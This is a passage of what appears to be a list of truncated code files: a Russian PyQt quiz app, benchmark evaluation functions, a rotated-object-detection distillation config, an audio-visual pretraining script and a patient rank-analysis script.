\u043c\u0438\u0440\u0435?', '\u0410\u043b\u044c\u043f\u044b', '\u0410\u043d\u0434\u044b', '\u0413\u0438\u043c\u0430\u043b\u0430\u0438', '\u041a\u043e\u0440\u0434\u0438\u043b\u044c\u0435\u0440\u044b'))\r\n\r\n\r\ndef next_question():\r\n    if win.q_index == len(questions):\r\n        win.q_index = 0\r\n        show_score()\r\n        win.score = 0\r\n    \r\n    if win.q_index == 0:\r\n        random.shuffle(questions)\r\n\r\n    ask(questions[win.q_index])\r\n    win.q_index += 1\r\n\r\n\r\ndef show_score():\r\n    percent = win.score / win.total * 100\r\n    percent = round(percent, 1)\r\n\r\n    text = '\u0423\u0432\u0430\u0436\u0430\u0435\u043c\u044b\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c!\\n'\r\n    text += '\u0412\u0430\u0448 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0441\u043e\u0441\u0442\u0430\u0432\u0438\u043b ' + str(percent) + '%\\n'\r\n    text += '\u0412\u044b \u043e\u0442\u0432\u0435\u0442\u0438\u043b\u0438 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e \u043d\u0430 ' + str(win.score) + ' \u0438\u0437 ' + str(win.total) + ' \u0432\u043e\u043f\u0440\u043e\u0441\u043e\u0432\\n'\r\n    text += '\u041f\u043e\u0441\u043b\u0435 \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u044f \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u043e\u043a\u043d\u0430 - \u0442\u0435\u0441\u0442 \u043d\u0430\u0447\u043d\u0435\u0442\u0441\u044f \u0437\u0430\u043d\u043e\u0432\u043e. \u0423\u0434\u0430\u0447\u0438!'\r\n\r\n    msg_box = QMessageBox()\r\n    msg_box.setWindowTitle('\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f')\r\n    msg_box.setText(text)\r\n    msg_box.exec()\r\n\r\n\r\ndef ask(q):  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\n    question_text.setText(q.question)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043d\u0430 \u0432\u0438\u0434\u0436\u0435\u0442 QLabel \u0444\u043e\u0440\u043c\u0443\u043b\u0438\u0440\u043e\u0432\u043a\u0438 \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\n    random.shuffle(answers)  # \u043f\u0435\u0440\u0435\u043c\u0435\u0448\u0430\u043b\u0438 \u043a\u043d\u043e\u043f\u043a\u0438\r\n    answers[0].setText(q.right_answer)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u043d\u0443\u043b\u0435\u0432\u0443\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442\r\n    answers[1].setText(q.wrong1)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u043f\u0435\u0440\u0432\u0443\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 \u21161\r\n    answers[2].setText(q.wrong2)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u0432\u0442\u043e\u0440\u0443\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 \u21162\r\n    answers[3].setText(q.wrong3)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u0442\u0440\u0435\u0442\u044c\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 \u21163\r\n\r\ndef check_answer():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0433\u043e \u043e\u0442\u0432\u0435\u0442\u0430\r\n    for rbtn in answers:  # \u0446\u0438\u043a\u043b \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0431\u043e\u0440\u0430 \u0432\u0441\u0435\u0445 \u043a\u043d\u043e\u043f\u043e\u043a \u0441 \u043e\u0442\u0432\u0435\u0442\u0430\u043c\u0438\r\n        if rbtn.isChecked():  # \u0435\u0441\u043b\u0438 \u043a\u043d\u043e\u043f\u043a\u0430 \u0431\u044b\u043b\u0430 \u0432\u044b\u0431\u0440\u0430\u043d\u0430\r\n            if rbtn.text() == answers[0].text():  # \u0435\u0441\u043b\u0438 \u044d\u0442\u043e \u0431\u044b\u043b \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442\r\n                right_text.setText('\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \"\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\"\r\n                right_answer.setText('\u041f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u044f\u0435\u043c!')  # \u0438 \u043f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n                win.score += 1\r\n            else:  # \u0438\u043d\u0430\u0447\u0435\r\n                right_text.setText('\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\"\r\n                right_answer.setText('\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442: ' + answers[0].text())  # \u0438 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442\r\n\r\n\r\ndef show_result():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043a\u0430\u0437\u0430 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432 \u043e\u0442\u0432\u0435\u0442\u0430 \u043d\u0430 \u0432\u043e\u043f\u0440\u043e\u0441\r\n    grp_box.hide()  # \u0441\u043f\u0440\u044f\u0442\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430\u043c\u0438 \u043e\u0442\u0432\u0435\u0442\u043e\u0432\r\n    grp_box_result.show()  # \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c\r\n    btn.setText('\u0421\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0432\u043e\u043f\u0440\u043e\u0441')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0435\r\n    check_answer()  # \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043e\u0442\u0432\u0435\u0442\u0430\r\n\r\ndef show_question():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043a\u0430\u0437\u0430 \u0432\u043e\u043f\u0440\u043e\u0441\u0430 \u0438 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432 \u043e\u0442\u0432\u0435\u0442\u0430\r\n    next_question()  # \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\n    grp_box.show()  # \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430\u043c\u0438 \u043e\u0442\u0432\u0435\u0442\u043e\u0432\r\n    grp_box_result.hide()  # \u0441\u043f\u0440\u044f\u0442\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c\r\n    btn.setText('\u041e\u0442\u0432\u0435\u0442\u0438\u0442\u044c')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0435\r\n    radio_group.setExclusive(False)  # \u0441\u043d\u0438\u043c\u0430\u0435\u043c \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u0432\u044b\u0431\u043e\u0440 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432\r\n    radio1.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21161 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio2.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21162 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio3.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21163 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio4.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21164 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio_group.setExclusive(True)  # \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u0432\u044b\u0431\u043e\u0440 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432\r\n\r\ndef start_test():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0431\u043e\u0440\u0430 \u0440\u0435\u0430\u043a\u0446\u0438\u0438 \u043d\u0430 \u043d\u0430\u0436\u0430\u0442\u0438\u0435 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443\r\n    if btn.text() == '\u041e\u0442\u0432\u0435\u0442\u0438\u0442\u044c':  # \u0435\u0441\u043b\u0438 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0435 \u0442\u0435\u043a\u0441\u0442 \"\u041e\u0442\u0432\u0435\u0442\u0438\u0442\u044c\"\r\n        show_result()  # \u0442\u043e \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e show_result\r\n    else:  # \u0438\u043d\u0430\u0447\u0435\r\n        show_question()  # \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e show_question\r\n\r\napp = QApplication([])  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u0430 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\r\nwin = QWidget()  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0433\u043b\u0430\u0432\u043d\u043e\u0433\u043e \u043e\u043a\u043d\u0430\r\nwin.setWindowTitle('MemoryCard')  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0430 \u0434\u043b\u044f \u043e\u043a\u043d\u0430\r\nwin.resize(400, 300)  # \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043e\u043a\u043d\u0430\r\nwin.q_index = 0  # \u0441\u043e\u0437\u0434\u0430\u043b\u0438 \u0438\u043d\u0434\u0435\u043a\u0441 \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\nwin.score = 0\r\nwin.total = len(questions)\r\n\r\nquestion_text = QLabel('\u0422\u0443\u0442 \u0431\u0443\u0434\u0435\u0442 \u0432\u043e\u043f\u0440\u043e\u0441')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u0442\u0435\u043a\u0441\u0442\u0430 \u0434\u043b\u044f \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\ngrp_box = QGroupBox('\u0412\u0430\u0440\u0438\u0430\u043d\u0442\u044b \u043e\u0442\u0432\u0435\u0442\u0430')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u0433\u0440\u0443\u043f\u043f\u044b\r\nradio1 = QRadioButton('1 \u0432\u0430\u0440\u0438\u0430\u043d\u0442')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u043a\u043d\u043e\u043f\u043a\u0438 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430 \u043e\u0442\u0432\u0435\u0442\u0430\r\nradio2 = QRadioButton('2 \u0432\u0430\u0440\u0438\u0430\u043d\u0442')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u043a\u043d\u043e\u043f\u043a\u0438 \u0432",
    "import os\nimport re\nimport json\nimport random\nfrom tqdm import tqdm\n\nimport numpy as np\nfrom rouge import Rouge \n\nimport torch\nfrom torchvision.ops import box_iou\n\n\ndef eval_web_caption(preds, golds, **kwargs):\n    assert len(preds) == len(golds)\n    for i in range(len(preds)):\n        if not preds[i]:\n            preds[i] = \" \"\n\n    rouge = Rouge(metrics=['rouge-1', 'rouge-2', 'rouge-l'])\n    scores = rouge.get_scores(preds, golds, avg=True)\n    return dict(\n        rouge_1=scores['rouge-1']['f'] * 100,\n        rouge_2=scores['rouge-2']['f'] * 100,\n        rouge_l=scores['rouge-l']['f'] * 100\n    )\n\n\ndef eval_head_ocr(preds, golds, **kwargs):\n    assert len(preds) == len(golds)\n    for i in range(len(preds)):\n        if not preds[i]:\n            preds[i] = \" \"\n\n    rouge = Rouge(metrics=['rouge-1', 'rouge-2', 'rouge-l'])\n    scores = rouge.get_scores(preds, golds, avg=True)\n    return dict(\n        rouge_1=scores['rouge-1']['f'] * 100,\n        rouge_2=scores['rouge-2']['f'] * 100,\n        rouge_l=scores['rouge-l']['f'] * 100\n    )\n\n\ndef eval_element_ocr(preds, golds, **kwargs):\n    assert len(preds) == len(golds)\n    for i in range(len(preds)):\n        if not preds[i] or len(preds[i]) == 1:\n            preds[i] = \" \"\n\n    rouge = Rouge(metrics=['rouge-1', 'rouge-2', 'rouge-l'])\n    scores = rouge.get_scores(preds, golds, avg=True)\n    return dict(\n        rouge_1=scores['rouge-1']['f'] * 100,\n        rouge_2=scores['rouge-2']['f'] * 100,\n        rouge_l=scores['rouge-l']['f'] * 100\n    )\n\n\ndef eval_action_prediction(preds, golds, **kwargs):\n    results = []\n    for pred, gold in zip(preds, golds):\n        cur_pred = parse_multi_choice_response(pred, [chr(ord('A')+i) for i in range(8)])\n        try:\n            if ord('A') <= ord(cur_pred) <= ord('Z'):\n                cur_pred = ord(cur_pred) - ord('A')\n            else:\n                cur_pred = -1\n        except:\n            cur_pred = -1\n        results.append(cur_pred == gold)\n\n    return dict(\n        accuracy=sum(results) / len(results) * 100\n    )\n\n\ndef eval_element_ground(preds, golds, **kwargs):\n    results = []\n    for pred, gold in zip(preds, golds):\n        cur_pred = parse_multi_choice_response(pred, [chr(ord('A')+i) for i in range(8)])\n        try:\n            if ord('A') <= ord(cur_pred) <= ord('Z'):\n                cur_pred = ord(cur_pred) - ord('A')\n            else:\n                cur_pred = -1\n        except:\n            cur_pred = -1\n        results.append(cur_pred == gold)\n\n    return dict(\n        accuracy=sum(results) / len(results) * 100\n    )\n\n\ndef eval_action_ground(preds, golds, **kwargs):\n    results = []\n    for pred, gold in zip(preds, golds):\n        cur_pred = parse_multi_choice_response(pred, [chr(ord('A')+i) for i in range(8)])\n        try:\n            if ord('A') <= ord(cur_pred) <= ord('Z'):\n                cur_pred = ord(cur_pred) - ord('A')\n            else:\n                cur_pred = -1\n        except:\n            cur_pred = -1\n        results.append(cur_pred == gold)\n\n    return dict(\n        accuracy=sum(results) / len(results) * 100\n    )\n\n\ndef eval_element_bbox_ground(preds, golds, **kwargs):\n    # print('preds[0]', preds[0])\n    # print('golds[0]', golds[0])\n    correct = total_cnt = 0\n    for i, predict_bbox in enumerate(preds):\n        if not predict_bbox:\n            predict_bbox = (0., 0., 0., 0.)\n        try:\n            target_bbox = torch.tensor(golds[i], dtype=torch.float32).view(-1, 4)\n            predict_bbox = torch.tensor(predict_bbox, dtype=torch.float32).view(-1, 4)\n            iou = box_iou(predict_bbox, target_bbox)\n            iou = iou.item()\n            if iou >= 0.5:\n                correct += 1\n        except:\n            pass\n\n        total_cnt += 1\n\n    return dict(\n        precision=correct / total_cnt * 100\n    )\n\n\ndef eval_action_bbox_ground(preds, golds, **kwargs):\n    correct = total_cnt = 0\n    for i, predict_bbox in enumerate(preds):\n        if not predict_bbox:\n            predict_bbox = (0., 0., 0., 0.)\n        try:\n            target_bbox = torch.tensor(golds[i], dtype=torch.float32).view(-1, 4)\n            predict_bbox = torch.tensor(predict_bbox, dtype=torch.float32).view(-1, 4)\n            iou = box_iou(predict_bbox, target_bbox)\n            iou = iou.item()\n            if iou >= 0.5:\n                correct += 1\n        except:\n            pass\n\n        total_cnt += 1\n\n    return dict(\n        precision=correct / total_cnt * 100\n    )\n\n\ndef eval_webqa(preds, golds, **kwargs):\n    f1_scores = []\n    rouge = Rouge(metrics=['rouge-1'])\n    for pred, gold_list in zip(preds, golds):\n        try:\n            if not pred:\n                pred = \" \"\n            cur_f1 = max([rouge.get_scores([pred], [gold], avg=True)['rouge-1']['f'] for gold in gold_list])\n            f1_scores.append(cur_f1)\n        except:\n            pass\n\n    return dict(\n        f1=sum(f1_scores) / len(f1_scores) * 100\n    )\n\ndef eval_element_point_ground(preds, golds):\n    acc_lst = []\n    for pred, gold in zip",
    "_base_ = [\n    '../../_base_/datasets/dotav1.py', '../../_base_/schedules/schedule_1x.py',\n    '../../_base_/default_runtime.py'\n]\nangle_version = 'le90'\n# runner\nrunner = dict(type=\"EpochBasedKDRunner\", max_epochs=12)\n# teacher cfg\ndistiller_cfg = dict(\n    teacher_cfg=\"configs/distillation/rotated_retinanet_obb_gwd_r101_fpn_1x_dota_le90.py\",\n    teacher_pretrained=\"teacher_checkpoints/rotated_retinanet_obb_gwd_r101.pth\",\n)\n\nmodel = dict(\n    type='DeFeatRotatedRetinaNet',\n    distillation=dict(\n        loss_balance = [1.0, 1.0],\n        # Align feat dim\n        # in_channels = 256,  # teacher FPN feat_dim\n        # feat_channels = 256,  # student FPN feat_dim\n        # conv_cfg = dict(type=\"Conv2d\"),\n        # norm_cfg = dict(type=\"BN\"),\n        # act_cfg = dict(type=\"ReLU\"),            \n    ),\n    backbone=dict(\n        type='ResNet',\n        depth=50,\n        num_stages=4,\n        out_indices=(0, 1, 2, 3),\n        frozen_stages=1,\n        zero_init_residual=False,\n        norm_cfg=dict(type='BN', requires_grad=True),\n        norm_eval=True,\n        style='pytorch',\n        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),\n    neck=dict(\n        type='FPN',\n        in_channels=[256, 512, 1024, 2048],\n        out_channels=256,\n        start_level=1,\n        add_extra_convs='on_input',\n        num_outs=5),\n    bbox_head=dict(\n        type='RotatedRetinaHead',\n        num_classes=15,\n        in_channels=256,\n        stacked_convs=4,\n        feat_channels=256,\n        assign_by_circumhbbox=None,\n        reg_decoded_bbox=True,\n        anchor_generator=dict(\n            type='RotatedAnchorGenerator',\n            octave_base_scale=4,\n            scales_per_octave=3,\n            ratios=[1.0, 0.5, 2.0],\n            strides=[8, 16, 32, 64, 128]),\n        bbox_coder=dict(\n            type='DeltaXYWHAOBBoxCoder',\n            angle_range=angle_version,\n            norm_factor=None,\n            edge_swap=True,\n            proj_xy=True,\n            target_means=(.0, .0, .0, .0, .0),\n            target_stds=(1.0, 1.0, 1.0, 1.0, 1.0)),\n        loss_cls=dict(\n            type='FocalLoss',\n            use_sigmoid=True,\n            gamma=2.0,\n            alpha=0.25,\n            loss_weight=1.0),\n        loss_bbox=dict(type='GDLoss', loss_type='gwd', loss_weight=5.0)),\n    train_cfg=dict(\n        assigner=dict(\n            type='MaxIoUAssigner',\n            pos_iou_thr=0.5,\n            neg_iou_thr=0.4,\n            min_pos_iou=0,\n            ignore_iof_thr=-1,\n            iou_calculator=dict(type='RBboxOverlaps2D')),\n        allowed_border=-1,\n        pos_weight=-1,\n        debug=False),\n    test_cfg=dict(\n        nms_pre=2000,\n        min_bbox_size=0,\n        score_thr=0.05,\n        nms=dict(iou_thr=0.1),\n        max_per_img=2000))\n\nimg_norm_cfg = dict(\n    mean=[123.675, 116.28, 103.53], std=[58.395, 57.12, 57.375], to_rgb=True)\ntrain_pipeline = [\n    dict(type='LoadImageFromFile'),\n    dict(type='LoadAnnotations', with_bbox=True),\n    dict(type='RResize', img_scale=(1024, 1024)),\n    dict(\n        type='RRandomFlip',\n        flip_ratio=[0.25, 0.25, 0.25],\n        direction=['horizontal', 'vertical', 'diagonal'],\n        version=angle_version),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='Pad', size_divisor=32),\n    dict(type='DefaultFormatBundle'),\n    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels'])\n]\ndata = dict(\n    samples_per_gpu=2,\n    workers_per_gpu=2,\n    train=dict(pipeline=train_pipeline, version=angle_version),\n    val=dict(version=angle_version),\n    test=dict(version=angle_version))\n",
    "import argparse\nimport os\nimport ast\nimport pickle\nimport sys\nimport time\nimport json\nimport torch\nfrom torch.utils.data import WeightedRandomSampler\nbasepath = os.path.dirname(os.path.dirname(sys.path[0]))\nsys.path.append(basepath)\n\n#### ---------> check if work on clip\n# import dataloader_clip as dataloader\n# import dataloader_clip_val as dataloader_val\n\nimport dataloader as dataloader\nimport dataloader_val as dataloader_val\n#### <-------\nimport models\nimport numpy as np\nfrom traintest_cavmae_base import train\nimport wandb\nimport utils\nimport random\n\nfrom torch.nn.parallel import DistributedDataParallel as DDP\nfrom seq_dataloader import SequentialDistributedSampler\n\n\ndef init_seeds(seed=0, cuda_deterministic=True):\n\trandom.seed(seed)\n\tnp.random.seed(seed)\n\ttorch.manual_seed(seed)\n\t# Speed-reproducibility tradeoff https://pytorch.org/docs/stable/notes/randomness.html\n\tif cuda_deterministic:  # slower, more reproducible\n\t\ttorch.backends.cudnn.deterministic = True\n\t\ttorch.backends.cudnn.benchmark = False\n\telse:  # faster, less reproducible\n\t\ttorch.backends.cudnn.deterministic = False\n\t\ttorch.backends.cudnn.benchmark = True\n\n# pretrain cav-mae model\n\nprint(\"I am process %s, running on %s: starting (%s)\" % (os.getpid(), os.uname()[1], time.asctime()))\n\nparser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument(\"--data-train\", type=str, default='', help=\"training data json\")\nparser.add_argument(\"--data-val\", type=str, default='', help=\"validation data json\")\nparser.add_argument(\"--data-eval\", type=str, default=None, help=\"evaluation data json\")\nparser.add_argument(\"--label-csv\", type=str, default='', help=\"csv with class labels\")\nparser.add_argument(\"--n_class\", type=int, default=527, help=\"number of classes\")\nparser.add_argument(\"--model\", type=str, default='ast', help=\"the model used\")\nparser.add_argument(\"--dataset\", type=str, default=\"audioset\", help=\"the dataset used\", choices=[\"audioset\", \"esc50\", \"speechcommands\", \"fsd50k\", \"vggsound\", \"epic\", \"k400\", \"msrvtt\"])\nparser.add_argument(\"--dataset_mean\", type=float, help=\"the dataset audio spec mean, used for input normalization\")\nparser.add_argument(\"--dataset_std\", type=float, help=\"the dataset audio spec std, used for input normalization\")\nparser.add_argument(\"--target_length\", type=int, help=\"the input length in frames\")\nparser.add_argument(\"--noise\", help='if use balance sampling', type=ast.literal_eval)\n\nparser.add_argument(\"--exp-dir\", type=str, default=\"\", help=\"directory to dump experiments\")\nparser.add_argument('--lr', '--learning-rate', default=0.001, type=float, metavar='LR', help='initial learning rate')\nparser.add_argument(\"--optim\", type=str, default=\"adam\", help=\"training optimizer\", choices=[\"sgd\", \"adam\"])\nparser.add_argument('-b', '--batch-size', default=12, type=int, metavar='N', help='mini-batch size')\nparser.add_argument('-w', '--num_workers', default=6, type=int, metavar='NW', help='# of workers for dataloading (default: 32)')\nparser.add_argument(\"--n-epochs\", type=int, default=1, help=\"number of maximum training epochs\")\n# not used in the formal experiments, only for preliminary experiments\nparser.add_argument(\"--lr_patience\", type=int, default=2, help=\"how many epoch to wait to reduce lr if mAP doesn't improve\")\nparser.add_argument(\"--lr_adapt\", help='if use adaptive learning rate', type=ast.literal_eval)\nparser.add_argument(\"--metrics\", type=str, default=\"mAP\", help=\"the main evaluation metrics in finetuning\", choices=[\"mAP\", \"acc\"])\nparser.add_argument('--warmup', help='if use warmup learning rate scheduler', type=ast.literal_eval, default='True')\nparser.add_argument(\"--lrscheduler_start\", default=10, type=int, help=\"when to start decay in finetuning\")\nparser.add_argument(\"--lrscheduler_step\", default=5, type=int, help=\"the number of step to decrease the learning rate in finetuning\")\nparser.add_argument(\"--lrscheduler_decay\", default=0.5, type=float, help=\"the learning rate decay ratio in finetuning\")\nparser.add_argument(\"--n-print-steps\", type=int, default=50, help=\"number of steps to print statistics\")\nparser.add_argument('--save_model', help='save the model or not', type=ast.literal_eval)\n\nparser.add_argument(\"--mixup\", type=float, default=0, help=\"how many (0-1) samples need to be mixup during training\")\nparser.add_argument(\"--bal\", type=str, default=None, help=\"use balanced sampling or not\")\n\nparser.add_argument(\"--cont_model\", help='previous pretrained model', type=str, default=None)\nparser.add_argument(\"--weight_file\", type=str, default=None, help=\"path to weight file\")\nparser.add_argument('--norm_pix_loss', help='if use norm_pix_loss', type=ast.literal_eval, default=None)\nparser.add_argument(\"--pretrain_path\", type=str, default='None', help=\"pretrained model path\")\nparser.add_argument(\"--contrast_loss_weight\", type=float, default=0.01, help=\"weight for contrastive loss\")\nparser.add_argument(\"--mae_loss_weight\", type=float, default=3.0, help=\"weight for mae loss\")\nparser.add_a",
    "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Nov 27 16:38:48 2023\n\n@author: lijiajun\n\"\"\"\nimport pandas as pd\nfrom sklearn.metrics import average_precision_score, precision_recall_curve,auc\n\nRNN = pd.read_csv('./result/rank_RNN.csv')\nML_voting = pd.read_csv('./data/rank_ML_voting.csv')\n\ndef Top(patient, rank):\n    df = pd.DataFrame({'patient':patient, 'rank':rank})\n    df1 = df.groupby('patient').agg(list)['rank'].to_frame().reset_index()\n    df1['top20'] = df1['rank'].apply(lambda x : len([j for j in x if j <= 20]))\n    df1['top50'] = df1['rank'].apply(lambda x : len([j for j in x if j <= 50]))\n    df1['top100'] = df1['rank'].apply(lambda x : len([j for j in x if j <= 100]))\n    \n    df1 = df1.sort_values(by='patient', ascending=True)\n    nci = [sum(df1.loc[:12,'top20']),sum(df1.loc[:12,'top50']),sum(df1.loc[:12,'top100'])]\n    hitide = [sum(df1.loc[13:21,'top20']),sum(df1.loc[13:21,'top50']),sum(df1.loc[13:21,'top100'])]\n    tesla = [sum(df1.loc[22:,'top20']),sum(df1.loc[22:,'top50']),sum(df1.loc[22:,'top100'])]\n    total = [sum(df1.loc[:,'top20']),sum(df1.loc[:,'top50']),sum(df1.loc[:,'top100'])]\n    return [nci, hitide, tesla, total]\n\n\nRNN_MP_num = Top(RNN['patient'], RNN['RNN_MP_rank'])\nRNN_NP_num = Top(RNN['patient'], RNN['RNN_NP_rank'])\nRNN_MB_num = Top(RNN['patient'], RNN['RNN_MB_rank'])\nRNN_NB_num = Top(RNN['patient'], RNN['RNN_NB_rank'])\nRNN_voting_num = Top(RNN['patient'], RNN['RNN_voting_rank'])\n\nML_voting_num = Top(ML_voting['patient'], ML_voting['ML_voting_rank'])\n\n\nnum_list = 